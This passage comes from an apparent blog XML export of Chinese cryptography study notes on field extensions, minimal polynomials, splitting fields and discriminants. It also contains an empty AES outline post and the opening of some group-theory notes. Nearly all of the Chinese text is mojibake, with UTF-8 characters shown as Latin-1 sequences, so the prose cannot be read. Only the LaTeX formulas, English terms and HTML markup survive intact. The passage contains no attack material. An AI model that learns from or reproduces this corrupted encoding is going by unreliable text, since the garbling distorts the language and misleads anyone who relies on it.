F[X]$æ˜¯å½¼æ­¤ä¸åŒçš„<strong>é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼</strong>ï¼Œ$e_1,e_2,â€¦,e_k\in\mathbb{N}$ã€‚</p><h2 id="ä»£æ•°æ‰©åŸŸ"><a href="#ä»£æ•°æ‰©åŸŸ" class="headerlink" title="ä»£æ•°æ‰©åŸŸ"></a>ä»£æ•°æ‰©åŸŸ</h2><ul><li><p><strong>æ‰©åŸŸ</strong>:$K$æ˜¯$F$çš„å­åŸŸï¼Œ$F$å°±æ˜¯$K$çš„æ‰©åŸŸæˆ–æ‰©å¼ (extension)</p></li><li><p><strong>çœŸå­åŸŸ</strong>:$K$è¿˜æ˜¯$F$çš„çœŸå­é›†ï¼Œåˆ™$K$æ˜¯$F$çš„çœŸå­åŸŸ</p></li><li><p><strong>ç´ åŸŸ</strong>(prime field):æ²¡æœ‰çœŸå­åŸŸçš„åŸŸ</p><p><strong>å®šç†1</strong>ï¼šåŸŸ$F$æ‰€æœ‰å­åŸŸçš„äº¤é›†$K$æ„æˆå®ƒçš„ç´ å­åŸŸã€‚</p><p><strong>å®šç†2</strong>ï¼šè®¾$K$æ˜¯$F$çš„å­åŸŸï¼Œé›†åˆ$M\subseteq F$,è®° $K(M)$ æ˜¯$F$æ‰€æœ‰åŒ…å«$K$å’Œ$M$çš„å­åŸŸçš„äº¤é›†ã€‚<br>$(1)K(M)$æ˜¯$K$çš„æ‰©åŸŸã€‚<br>$(2)K(M)$æ˜¯åŒ…å«$K$å’Œ$M$çš„æœ€å°å­åŸŸã€‚</p><blockquote><p>ç´ åŸŸçš„ä»»ä½•çœŸå­é›†éƒ½ä¸å¯èƒ½æ„æˆå®ƒçš„å­åŸŸ<br>ç´ åŸŸçš„ä»»ä½•å­åŸŸéƒ½æ˜¯å®ƒæœ¬èº«</p><p><strong>ä¾‹</strong>ï¼šæœ‰ç†æ•°åŸŸæ˜¯ç´ åŸŸ</p></blockquote></li></ul><h3 id="ä»£æ•°æ‰©åŸŸ-algebraic-extension-field"><a href="#ä»£æ•°æ‰©åŸŸ-algebraic-extension-field" class="headerlink" title="ä»£æ•°æ‰©åŸŸ(algebraic extension field)"></a>ä»£æ•°æ‰©åŸŸ(algebraic extension field)</h3><p><strong>å®šä¹‰</strong>ï¼š$K$æ˜¯$F$çš„å­åŸŸï¼Œåˆ™</p><p>(1) å¯¹äº$a\in F$,å­˜åœ¨éå¸¸æ•°å¤šé¡¹å¼$f(\boldsymbol{x})$,å…¶ç³»æ•°æ¥è‡ª$K$,æœ‰<br>$f(a)=\theta$,ç§°$a$ æ˜¯$K$ä¸Š<strong>ä»£æ•°çš„</strong>ã€‚(å¦‚æœ<strong>ä¸å­˜åœ¨</strong>è¿™æ ·çš„å¤šé¡¹å¼ï¼Œ$a$å«$K$ä¸Š<strong>è¶…è¶Šçš„</strong>)</p><p>(2)$L$æ˜¯$K$çš„æ‰©åŸŸã€‚$\forall b\in L$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç§°$L$æ˜¯$K$çš„ä»£æ•°æ‰©åŸŸæˆ–<strong>ä»£æ•°æ‰©å¼ </strong> (algebraic extension)ã€‚</p><p><strong>å®šç†</strong>ï¼š$J=\{f(x)\in K[X]|f(a)=\theta\}$,å­˜åœ¨å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼$g(x)\in K[X]$,æœ‰$J=(g(x))$ã€‚<br><strong>å®šç†</strong>ï¼šä»¥ä¸Š$g(x)$æ˜¯$K[X]$ä¸­ä¸å¯çº¦å¤šé¡¹å¼ã€‚</p><h3 id="æå°å¤šé¡¹å¼-minimal-polynomial"><a href="#æå°å¤šé¡¹å¼-minimal-polynomial" class="headerlink" title="æå°å¤šé¡¹å¼ (minimal polynomial)"></a>æå°å¤šé¡¹å¼ (minimal polynomial)</h3><p>æ€§è´¨ï¼š$K$æ˜¯$F$çš„å­åŸŸï¼Œ$a$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç›¸åº”çš„æå°å¤šé¡¹å¼ä¸º</p><p>$g(x)\in K[X]$,åˆ™ï¼š</p><ol><li><p>$g(x)$ æ˜¯$K[X]$é‡Œçš„ä¸å¯çº¦å¤šé¡¹å¼ (è¯æ˜è§ä¸ŠæœŸ)</p></li><li><script type="math/tex; mode=display">g(x)\mid f(x)\Leftrightarrow f(x)\in K[X],\:f(a)=\theta</script></li><li><p>$g(x)$æ˜¯$K[X]$é‡Œä»¥$a$ä¸ºæ ¹çš„é¦–ä¸€å¤šé¡¹å¼ä¸­åº¦æœ€å°çš„</p><script type="math/tex; mode=display">J=(g(x))=\{f(x)\in K[X]|f(a)=\theta\}</script></li></ol><h2 id="åŸŸçš„æ‰©å¼ "><a href="#åŸŸçš„æ‰©å¼ " class="headerlink" title="åŸŸçš„æ‰©å¼ "></a>åŸŸçš„æ‰©å¼ </h2><p>æ‰©åŸŸæ˜¯å‘é‡ç©ºé—´</p><p><strong>å®šç†ï¼šåŸŸæ˜¯å…¶ä»»æ„å­åŸŸä¸Šçš„å‘é‡ç©ºé—´</strong></p><h3 id="å‘é‡ç©ºé—´-vector-space"><a href="#å‘é‡ç©ºé—´-vector-space" class="headerlink" title="å‘é‡ç©ºé—´(vector space)"></a>å‘é‡ç©ºé—´(vector space)</h3><p>å®šä¹‰ï¼šè®¾$v$æ˜¯éç©ºé›†åˆï¼Œ$K$çš„åŸŸï¼Œ$V$ä¸­å…ƒç´ ç§°ä¸º<strong>å‘é‡(vector)</strong>,$K$ç§°ä¸ºå…¶<strong>åŸºåŸŸ(base field)</strong>, $K$ä¸­å…ƒç´ ç§°ä¸º<strong>æ ‡é‡(scalar)</strong>ã€‚</p><p><strong>åŸº</strong>ï¼šæœ€å¤§çº¿æ€§æ— å…³å‘é‡ç»„</p><p>åŸºé‡Œå‘é‡çš„ä¸ªæ•°=<strong>å‘é‡ç©ºé—´ç»´åº¦</strong>$= [ F{: }K]$ $( K$ä¸Š$F$çš„åº¦)</p><blockquote><p>nç»´æ¬§å‡ é‡Œå¾—ç©ºé—´$R^n$<br>å®ç³»æ•°åº¦ä¸è¶…è¿‡$n$çš„å…¨ä½“å¤šé¡¹å¼<br>ä»¥å®æ•°ä¸ºå®šä¹‰åŸŸå’Œå€¼åŸŸçš„å…¨ä½“è¿ç»­å‡½æ•°</p></blockquote><p>$V$æ˜¯$K$ä¸Šçš„å‘é‡ç©ºé—´,é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶(æˆ–ç§°å…¬ç†):$\quad\forall X,Y\in V,\forall a,b\in K,e\in K$</p><ul><li><strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong>:å‘é‡é—´çš„åŠ æ³•</li><li><strong>æ ‡é‡ä¹˜æ³•</strong>:<ul><li>å°é—­æ€§:$aX\in V$</li><li>ç»“åˆå¾‹:$a(bX)=(abX)$</li><li>å•ä½å…ƒ: $eX=X$</li><li>åˆ†é…å¾‹:$a(X+Y)=aX+aY\quad(a+b)X=aX+bX$</li></ul></li></ul><h3 id="æœ‰é™æ‰©å¼ -finite-extension"><a href="#æœ‰é™æ‰©å¼ -finite-extension" class="headerlink" title="æœ‰é™æ‰©å¼ (finite extension)"></a>æœ‰é™æ‰©å¼ (finite extension)</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾$F$æ˜¯Kçš„æ‰©åŸŸã€‚$F$æ˜¯$K$ä¸Šæœ‰é™ç»´åº¦çš„å‘é‡ç©ºé—´ï¼Œç§°$F$æ˜¯$K$çš„<strong>æœ‰é™æ‰©å¼ </strong>æˆ–<strong>æœ‰é™æ‰©åŸŸ</strong> (finite extension field) ã€‚</p><p>æœ‰é™åŸŸæ˜¯æœ‰é™ç»´åº¦çš„å‘é‡ç©ºé—´$\Longrightarrow$æœ‰é™åŸŸçš„åº¦æ˜¯æœ‰é™çš„</p><p>æ¯ä¸ªåŸŸå¯ä»¥çœ‹ä½œè‡ªèº«çš„ä¼˜å…ˆæ‰©å¼ ï¼š</p><ul><li>$[K{:}K]=1$</li><li>$[F{:}K]=1\Leftrightarrow F=K$</li></ul><blockquote><ul><li><p>$[Q(\sqrt2):Q]=2\ åŸºï¼š\{1ã€\sqrt2\}$ </p><p>$Q(\sqrt2)=\{a+b\sqrt2\|a,b\in Q\}$</p></li><li><p>$[C:R]=2\ åŸºï¼š\{1ã€i\}$</p></li><li><p>$[R:Q]=âˆ$</p></li></ul></blockquote><p><strong>å®šç†1</strong>ï¼š$F$æ˜¯$L$çš„æœ‰é™æ‰©å¼ ï¼Œ$L$æ˜¯$K$çš„æœ‰é™æ‰©å¼ ï¼Œåˆ™$F$æ˜¯$K$çš„æœ‰é™æ‰©å¼ ï¼Œä¸”<br>$[F:K]=[F:L][L:K]$</p><p><strong>å®šç†2</strong>ï¼šæœ‰é™æ‰©å¼ æ—¶ä»£æ•°æ‰©å¼ (ä»£æ•°æ‰©åŸŸ)</p><h3 id="å•ä»£æ•°æ‰©å¼ -simple-algebraic-extension"><a href="#å•ä»£æ•°æ‰©å¼ -simple-algebraic-extension" class="headerlink" title="å•ä»£æ•°æ‰©å¼ (simple algebraic extension)"></a>å•ä»£æ•°æ‰©å¼ (simple algebraic extension)</h3><p><strong>å®šä¹‰ï¼š</strong>$F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$a\in F$,ä¸”$a$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç§°$K(a)$æ˜¯ $K$çš„<strong>å•</strong><br><strong>ä»£æ•°æ‰©å¼ æˆ–å•ä»£æ•°æ‰©åŸŸ (simple algebraic extension field)</strong>ã€‚</p><p><strong>å®šç†1</strong>:$g(x)\in K[X]æ˜¯ä¸å¯çº¦å¤šé¡¹å¼\Rightarrow(g(x))æ˜¯æå¤§ç†æƒ³$</p><p><strong>å®šç†2</strong>:$g(x)\in K[X]æ˜¯Kä¸Šä¸å¯çº¦å¤šé¡¹å¼,åˆ™å­˜åœ¨Kçš„å•ä»£æ•°æ‰©å¼ ,å®ƒä»¥g(x)çš„æ ¹ä¸ºå®šä¹‰å…ƒç´ $</p><p><strong>å®šç†3</strong>:$g(x)\in K[X]$æ˜¯$K$ä¸Šä¸å¯çº¦å¤šé¡¹å¼ï¼Œ$a,b$æ˜¯$g(x)$çš„ä¸¤ä¸ªæ ¹ï¼Œåˆ™$K(a)\cong K(b)$ (åŒæ„ä¸ºæŠŠ$a$æ˜ å°„æˆ$b)$</p><p>$I$æ˜¯æå¤§ç†æƒ³$\Leftrightarrow R/I$ æ˜¯åŸŸ($R$æ˜¯å«å¹ºäº¤æ¢ç¯)</p><p>$(g(x))$æ˜¯æå¤§ç†æƒ³$\Leftrightarrow K[X]/(g(x))$   ($K[X]$æ˜¯å«å¹ºäº¤æ¢ç¯)</p><p>è®¾$F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$a\in F$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œ$g(x)$æ˜¯ç›¸åº”çš„æå°å¤šé¡¹å¼ï¼Œ<br>åº¦ä¸º$n$,åˆ™:</p><ul><li>æ€§è´¨1:$K(a)\cong K[X]/(g(x))$</li><li>æ€§è´¨2:$[K(a):K]=n$,ä¸”$(e,a,â€¦,a^{n-1})$æ˜¯$K$ä¸Š$K(a)$çš„åŸº</li><li>æ€§è´¨3:$\forall b\in K(a)$éƒ½æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç›¸åº”æå°å¤šé¡¹å¼çš„åº¦éƒ½æ˜¯$n$<strong>çš„å› å­</strong></li></ul><p>$L$æ˜¯$K$çš„æœ‰é™æ‰©å¼ $\Rightarrow L$æ˜¯$K$çš„ä»£æ•°æ‰©å¼ <br>$L$æ˜¯$K$çš„æœ‰é™æ‰©å¼ $\not\Leftarrow L$æ˜¯$K$çš„ä»£æ•°æ‰©å¼ </p><blockquote><p>ä¾‹ï¼šRæ˜¯Qçš„æ‰©åŸŸï¼Œ$\sqrt2\in R$ </p><p>(1)$Q(\sqrt{2})$æ˜¯Qçš„å•ä»£æ•°æ‰©å¼  ?</p><p>$g(x)=x^2-2\in Q[X]$,æœ‰$g(\sqrt{2})=0$,åˆ™$\sqrt{2}$æ˜¯Qä¸Šä»£æ•°çš„ï¼Œ<br>æ‰€ä»¥ï¼Œ$\mathbb{Q}(\sqrt{2})$æ˜¯Qçš„å•ä»£æ•°æ‰©å¼ ã€‚</p><p>(2)ä¸ºä»€ä¹ˆ$[Q( \sqrt {2}) {: }Q] = 2$ ? </p><p>äº‹å®ä¸Šï¼Œ$g(x)=x^2-2$æ˜¯Qä¸Š$\sqrt{2}$çš„æå°å¤šé¡¹å¼ã€‚</p><p>å› ä¸º$deg(g(x))=2$,æ‰€ä»¥$\left[Q(\sqrt{2}){:}Q\right]=2$,å³$Q(\sqrt{2})$çš„åŸºæœ‰ä¸¤ä¸ªå…ƒç´ </p><p>(3)$Q(\sqrt{2})$çš„å…ƒç´ éƒ½é•¿ä»€ä¹ˆæ ·ï¼Ÿ</p><p>åŸºçš„ä¸¤ä¸ªå…ƒç´ ï¼š($\sqrt2)^0=1$ã€($\sqrt{2})^1=\sqrt{2}$</p><p>å› æ­¤ï¼Œ$Q(\sqrt2)=\{b_0+b_1\sqrt2\mid b_0,b_1\in Q\}$</p><p>ä¾‹ï¼š$Z_3=\{0,1,2\}$æ˜¯åŸŸï¼Œ$g(x)=x^2+x+2\in\mathbb{Z}_3[X]$æ˜¯$\mathbb{Z}_3$ä¸Šä¸å¯çº¦çš„ã€‚</p><p>è®¾$a:=[x]\in\mathbb{Z}_3/(g(x))$æ˜¯$g(x)$çš„æ ¹ï¼Œå³$g(a)=a^2+a+2=0$</p><p>å› ä¸º$deg(g(x))=2$,åˆ™$Z_3(a)$çš„åŸºæœ‰ä¸¤ä¸ªå…ƒç´ ï¼š$1=a^0$å’Œ$a=a^1$</p><p>æ‰€ä»¥ï¼Œ$Z_3(a)=\{b_0+b_1a\mid b_0,b_1\in Z_3\}=\{0,1,2,a,a+1,a+2,2a,2a+1,2a+2\}$</p><p>$2a+2$ä¹Ÿæ˜¯$g(x)$çš„æ ¹ï¼Œå› ä¸º$g(2a+2)=(2a+2)^2+(2a+2)+2=0$<br>å› ä¸º$deg(g(x))=2$,åˆ™$Z_3(2a+2)$çš„åŸºæœ‰ä¸¤ä¸ªå…ƒç´ ï¼š1å’Œ$2a+2$<br>æ‰€ä»¥ï¼Œ$Z_3(2a+2)=\{b_0+b_1(2a+2)\mid b_0,b_1\in Z_3\}=\{0,1,2,a,a+1,a+2,2a,2a+1,2a+2\}=Z_3(a)$</p></blockquote><h4 id="æ„é€ å•ä»£æ•°æ‰©å¼ "><a href="#æ„é€ å•ä»£æ•°æ‰©å¼ " class="headerlink" title="æ„é€ å•ä»£æ•°æ‰©å¼ "></a>æ„é€ å•ä»£æ•°æ‰©å¼ </h4><ul><li>1.$æ‰¾Kä¸Šä¸å¯çº¦å¤šé¡¹å¼,è®¾ä¸ºg(x)$</li><li>2.$æ‰¾g(x)çš„ä¸€ä¸ªæ ¹,è®¾ä¸ºaã€‚å•ä»£æ•°æ‰©å¼ å°±æ˜¯K(a)$</li><li>3.$è®¾deg(g(x))=n,åˆ™K(a)çš„åŸºä¸º: e,a,â€¦,a^{n-1}$</li><li>4.$K(a)å…ƒç´ :b_0+b_1a+\cdots+b_{n-1}a^{n-1}\left(b_i\in K\right)$</li></ul><h4 id="åº”ç”¨å•ä»£æ•°æ‰©å¼ "><a href="#åº”ç”¨å•ä»£æ•°æ‰©å¼ " class="headerlink" title="åº”ç”¨å•ä»£æ•°æ‰©å¼ "></a>åº”ç”¨å•ä»£æ•°æ‰©å¼ </h4><p><strong>å®šç†1</strong>:$Fæ˜¯Kçš„æ‰©åŸŸ,a,b\in F,åˆ™ K(a,b)=K(a)(b)$</p><p><strong>å®šç†2</strong>:$Fæ˜¯Kçš„æ‰©åŸŸï¼Œa_1,â€¦,a_m\in F,åˆ™K(a_1,â€¦,a_m)=K(a_1,â€¦,a_{m-1})(a_m)$</p><p><strong>å®šç†3</strong>:$a_1,â€¦,a_mæ˜¯Kä¸Šä»£æ•°çš„\Rightarrow K(a_1,â€¦,a_m)$æ˜¯æœ‰é™æ‰©å¼ /ä»£æ•°æ‰©å¼ </p><blockquote><p>å¦‚ä½•è®¡ç®— $K(a_1,â€¦,a_m)$ çš„æ‰©å¼ ç»´åº¦$[K(a_1,â€¦,a_m){:}K]$</p><p>ä¾‹ï¼šæ±‚ [$Q(\sqrt2,\sqrt3){:}Q]$</p><p>è§£ï¼š$[Q(\sqrt{2}){:}Q]=2,[Q(\sqrt{2})(\sqrt{3}){:}Q(\sqrt{2})]=2$</p><script type="math/tex; mode=display">\begin{aligned}[Q(\sqrt{2},\sqrt{3});Q]&=[Q(\sqrt{2})(\sqrt{3});Q]\\&=[Q(\sqrt{2})(\sqrt{3});Q(\sqrt{2})][Q(\sqrt{2});Q]\\&=2\times2\\&=4\end{aligned}</script></blockquote><p><strong>å®šç†4</strong>ï¼š$L$æ˜¯Kçš„æœ‰é™æ‰©å¼ $\Leftrightarrow$å­˜åœ¨$a_1,â€¦,a_m\in L$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œä½¿å¾—$L=K(a_1,â€¦,a_m)$</p><h3 id="åˆ†è£‚åŸŸ-splitting-field"><a href="#åˆ†è£‚åŸŸ-splitting-field" class="headerlink" title="åˆ†è£‚åŸŸ(splitting field)"></a>åˆ†è£‚åŸŸ(splitting field)</h3><p><strong>å®šä¹‰(åˆ†è£‚)</strong>:$L$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$f(x)\in K[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ $(deg(f(x))&gt;0),å¦‚æœf(x)$å¯ä»¥å†™æˆä¸€æ¬¡å› å¼ä¹˜ç§¯çš„å½¢å¼ï¼š<br>$f(x)=b(x-a_1)(x-a_2)â€¦(x-a_m)$ ($b$æ˜¯$f(x)$é¦–é¡¹ç³»æ•°)<br>å…¶ä¸­ï¼Œ$a_1,â€¦,a_m\in L$,ç§° $f(x)$åœ¨$L$é‡Œ<strong>åˆ†è£‚</strong>ã€‚</p><p><strong>å®šä¹‰(åˆ†è£‚åŸŸ)</strong>:$f(x)$åœ¨$L$é‡Œåˆ†è£‚ï¼Œä¸”$L=K(a_1,â€¦,a_m)$,åˆ™ç§°$L$æ˜¯$K$ä¸Š$f(x)$<br>çš„<strong>åˆ†è£‚åŸŸ</strong>ã€‚</p><p><strong>åˆ†è£‚åŸŸæ˜¯æœ‰é™æ‰©å¼ /ä»£æ•°æ‰©å¼ </strong></p><p>$[L:K]\leq deg(f(x))$</p><p>ç”¨ä¸å¯çº¦å¤šé¡¹å¼çš„ä¸€ä¸ªæ ¹$a$æ„é€ çš„åŸŸ$K(a)$ä¸ä¸€å®šæ˜¯$g(x)$çš„åˆ†è£‚åŸŸï¼Œå› ä¸ºå®ƒæœªå¿…åŒ…å«$g(x)$çš„æ‰€æœ‰æ ¹ã€‚</p><blockquote><script type="math/tex; mode=display">\begin{aligned}&\text{ä¾‹:}f(x)=3(x^2-2)(x^2-3)(x^2-6)(x^2+1)\in Q[X]\text{,æ±‚}f(x)\text{çš„åˆ†è£‚åŸŸ}\\&\text{è§£:}f(x)=3(x^2-2)(x^2-3)(x^2-6)(x^2+1)\\&=3(x-\sqrt{2})(x+\sqrt{2})(x-\sqrt{3})(x+\sqrt{3})\\&(x-\sqrt{6})(x+\sqrt{6})(x-i)(x+i)\\&\text{æ‰€ä»¥,}f(x)\text{çš„æ ¹ä¸º}\pm\sqrt{2}\text{ã€}\pm\sqrt{3}\text{ã€}\pm\sqrt{6}\text{ã€}\pm i\text{ã€‚}\end{aligned}</script><p><script type="math/tex">Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i,-i)</script>åŒ–ç®€æ€è€ƒè¿‡ç¨‹ï¼š</p><ul><li>$-\sqrt{2}\in Q(\sqrt{2})$,åˆ™$Q(\sqrt{2},-\sqrt{2})=Q(\sqrt{2})$</li><li>$\sqrt{3}\notin Q(\sqrt{2}$ ),åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3})=Q(\sqrt{2},\sqrt{3})$</li><li>$-\sqrt{3}\in Q(\sqrt{2},\sqrt{3})$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3})=Q(\sqrt{2},\sqrt{3})$</li><li>$\pm\sqrt{6}\in Q(\sqrt{2},\sqrt{3})$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6})=Q(\sqrt{2},\sqrt{3})$</li><li>$i\notin Q(\sqrt{2},\sqrt{3})$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i)=Q(\sqrt{2},\sqrt{3},i)$</li><li>$-i\in Q(\sqrt{2},\sqrt{3},i)$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i,-i)=Q(\sqrt{2},\sqrt{3},i)$</li></ul><p>$f(x)çš„åˆ†è£‚åŸŸä¸ºQ(\sqrt{2},\sqrt{3},i)(å®ƒæ˜¯åŒ…å«Qå’Œf(x)æ‰€æœ‰æ ¹çš„æœ€å°æ‰©åŸŸ)$</p></blockquote><p><strong>å®šç†1(åˆ†è£‚åŸŸçš„å­˜åœ¨æ€§å’Œå”¯ä¸€æ€§)</strong>:å¯¹äº$\forall f(x)\in K[X]$éå¸¸æ•°å¤šé¡¹å¼åˆ™å­˜åœ¨$K$ä¸Š$f(x)$çš„åˆ†è£‚åŸŸã€‚è€Œä¸”ï¼Œä»»ä½•$K$ä¸Š$f(x)$ çš„åˆ†è£‚åŸŸéƒ½æ˜¯åŒæ„çš„</p><h4 id="åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼"><a href="#åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼" class="headerlink" title="åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼"></a>åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼</h4><p><strong>å®šä¹‰(åˆ¤åˆ«å¼)</strong>:$f(x)\in K[X],deg(f(x))\geq2,f(x)=b(x-a_1)(x-$<br>$a_2)â€¦(x-a_m)$ (bæ˜¯$f(x)$é¦–é¡¹ç³»æ•°),$a_1,â€¦,a_m$å±äº$f(x)$åœ¨$K$ ä¸Šçš„åˆ†è£‚åŸŸï¼Œåˆ™$f(x)$çš„<strong>åˆ¤åˆ«å¼(discriminant)</strong>ä¸º</p><script type="math/tex; mode=display">D\big(f(x)\big)=b^{2m-2}\prod_{1\leq i<j\leq m}(a_i-a_j)^2</script>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> æŠ½è±¡ä»£æ•° </tag>
            
            <tag> ç¯è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç ç®—æ³•ç¯‡Â·AES</title>
      <link href="/2024/08/04/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7AES/"/>
      <url>/2024/08/04/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7AES/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/francisrstokes/githublog/blob/main/2022/6/15/rolling-your-own-crypto-aes.md">githublog/2022/6/15/rolling-your-own-crypto-aes.md at main Â· francisrstokes/githublog</a></p><h2 id="åˆå§‹å˜æ¢-initial-round"><a href="#åˆå§‹å˜æ¢-initial-round" class="headerlink" title="åˆå§‹å˜æ¢(initial round)"></a>åˆå§‹å˜æ¢(initial round)</h2><h2 id="9è½®å¾ªç¯è¿ç®—-9-rounds"><a href="#9è½®å¾ªç¯è¿ç®—-9-rounds" class="headerlink" title="9è½®å¾ªç¯è¿ç®—(9 rounds)"></a>9è½®å¾ªç¯è¿ç®—(9 rounds)</h2><h3 id="å­—èŠ‚ä»£æ¢-SubBytes"><a href="#å­—èŠ‚ä»£æ¢-SubBytes" class="headerlink" title="å­—èŠ‚ä»£æ¢(SubBytes)"></a>å­—èŠ‚ä»£æ¢(SubBytes)</h3><p>æŸ¥è¡¨</p><h3 id="è¡Œç§»ä½-ShiftRows"><a href="#è¡Œç§»ä½-ShiftRows" class="headerlink" title="è¡Œç§»ä½(ShiftRows)"></a>è¡Œç§»ä½(ShiftRows)</h3><h3 id="åˆ—æ··åˆ-MixColumns"><a href="#åˆ—æ··åˆ-MixColumns" class="headerlink" title="åˆ—æ··åˆ(MixColumns)"></a>åˆ—æ··åˆ(MixColumns)</h3><h3 id="è½®å¯†é’¥åŠ -AddRoundKey"><a href="#è½®å¯†é’¥åŠ -AddRoundKey" class="headerlink" title="è½®å¯†é’¥åŠ (AddRoundKey)"></a>è½®å¯†é’¥åŠ (AddRoundKey)</h3><h2 id="1è½®æœ€ç»ˆè½®-Final-Round"><a href="#1è½®æœ€ç»ˆè½®-Final-Round" class="headerlink" title="1è½®æœ€ç»ˆè½®(Final Round)"></a>1è½®æœ€ç»ˆè½®(Final Round)</h2>]]></content>
      
      
      <categories>
          
          <category> å¯†ç ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æŠ½è±¡ä»£æ•°Â·ç¾¤è®º</title>
      <link href="/2024/08/01/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%BE%A4%E8%AE%BA/"/>
      <url>/2024/08/01/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%BE%A4%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰</h2><hr><h1 id="ç¾¤è®º"><a href="#ç¾¤è®º" class="headerlink" title="ç¾¤è®º"></a>ç¾¤è®º</h1><hr><h2 id="ä»£æ•°ç»“æ„-algebraic-structure"><a href="#ä»£æ•°ç»“æ„-algebraic-structure" class="headerlink" title="ä»£æ•°ç»“æ„(algebraic structure)"></a>ä»£æ•°ç»“æ„(algebraic structure)</h2><p>$(G,ğŸ±,ğŸ¥’\dots$)</p><p>$GæŒ‡éç©ºé›†åˆï¼Œ\underbrace{ğŸ±, ğŸ¥’ ,\dots}_{äºŒå…ƒè¿ç®—(éœ€è¦ä¸¤ä¸ªè¿ç®—æ•°)}$</p><script type="math/tex; mode=display">\begin{align}   å°é—­æ€§ï¼š\forall\ a,b & \in G,   \\   ağŸ±b & \in G\\a ğŸ¥’ b & \in G\\ \dots \\é›†åˆä¸­ä»»æ„ä¸¤ä¸ªå…ƒç´ è¿ç®—&çš„ç»“æœä»ç„¶æ˜¯è¿™ä¸ªé›†åˆé‡Œçš„å…ƒç´ \end{align}</script><p><strong>ä»£æ•°ç»“æ„å¿…é¡»æ»¡è¶³å°é—­æ€§</strong></p><hr><h2 id="ç¾¤-Group"><a href="#ç¾¤-Group" class="headerlink" title="ç¾¤(Group)"></a>ç¾¤(Group)</h2><p><strong>å®šä¹‰</strong>ï¼šè‹¥<script type="math/tex">(G,*)</script>æ˜¯ä¸€ä¸ªç¾¤ï¼Œåˆ™å®ƒæ»¡è¶³ä»¥ä¸‹<strong>æ€§è´¨</strong>ï¼š</p><ul><li><p>å°é—­æ€§ï¼š$ \forall a,b\in \mathbb{G}, a*b \in \mathbb{G}$</p></li><li><p>ç»“åˆå¾‹ï¼š<script type="math/tex">\forall a,b,c\in \mathbb{G}, a*(b*c)=(a*b)*c</script></p></li><li><p>å•ä½å…ƒ(å¹ºå…ƒ,identity)ï¼š<script type="math/tex">\exists e\in \mathbb{G} , \forall a\in \mathbb{G} , a*e=e*a=a</script></p><p><strong>å®šç†1ï¼šç¾¤é‡Œçš„å•ä½å…ƒæ˜¯å”¯ä¸€çš„</strong></p></li><li><p>é€†å…ƒ(inverse)ï¼š<script type="math/tex">\exists b\in \mathbb{G} , a*b=b*a=e</script><br><script type="math/tex">açš„é€†å…ƒè®°ä¸ºa^{-1},å³a^{-1}=b,b^{-1}=aï¼Œ\\å•ä½å…ƒä»¥è‡ªèº«ä¸ºé€†å…ƒ</script></p><p><strong>å®šç†2:æ¯ä¸ªå…ƒç´ éƒ½æœ‰å”¯ä¸€çš„é€†å…ƒ</strong></p></li></ul><blockquote><p>ä¾‹ï¼š</p><p>$(\mathbb{Z},+)$<br>å°é—­æ€§ï¼šæ•´æ•°ç›¸åŠ 